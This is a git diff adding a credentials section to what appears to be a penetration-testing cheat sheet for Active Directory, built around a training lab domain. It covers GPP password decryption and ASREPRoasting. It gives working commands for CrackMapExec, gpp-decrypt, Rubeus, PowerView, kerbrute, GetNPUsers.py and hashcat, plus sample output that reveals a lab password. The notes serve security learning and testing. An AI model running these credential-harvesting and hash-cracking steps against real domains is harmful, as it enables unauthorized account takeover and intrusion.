@@ -326,9 +326,103 @@ ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10
 
 Other tools related to ldap: `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.
 
+## 4. Credentials
+
+### Credentials in SMB Shares and SYSVOL Scripts
+
+The SYSVOL share can be a treasure trove of data, especially in large organizations. It is recommendable always have to look at it.
+
+#### Group Policy Preferences (GPP) Passwords 
+
+When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+
+- Map drives (drives.xml)
+- Create local users
+- Create printer config files (printers.xml)
+- Creating and updating services (services.xml)
+- Creating scheduled tasks (scheduledtasks.xml)
+- Changing local admin passwords.
+
+These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+
+This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+
+In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:
+
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+```
+
+Locating & Retrieving GPP Passwords with CrackMapExec
+
+```shell-session
+crackmapexec smb -L | grep gpp
+```
+
+To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.
 
 
-## 4. Shares
+```bash
+crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
+# Example:
+# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+```
+
+Results:
+```
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+### 💡 ASREPRoasting
+
+It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. 
+
+ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
+
+#### DONT_REQ_PREAUTH Value using Get-DomainUser
+
+Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+```
+
+With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
+
+```powershell
+# Retrieving AS-REP in Proper Format using Rubeus
+.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
+# Example:
+# .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
+Cracking the Hash Offline with Hashcat:
+
+```bash
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+```
+
+#### DONT_REQ_PREAUTH Value using kerbrute
+
+```shell-session
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+```
+
+However, this will be as accurate as the user list.
+
+
+####  Get-NPUsers.py from the Impacket toolkit
+
+```bash
+# Retuns all users that with DONT_REQ_PREAUTH amd UF_DONT_REQ_PREAUTH
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile jsmith.txt | grep -v SessionError
+```
+
+
+## 5. Shares
 
 ### crackmapexec
 
@@ -417,4 +511,5 @@ enumprivs
 # Enumerating SID from LSA
 lsaenumsid
 ```
+
 
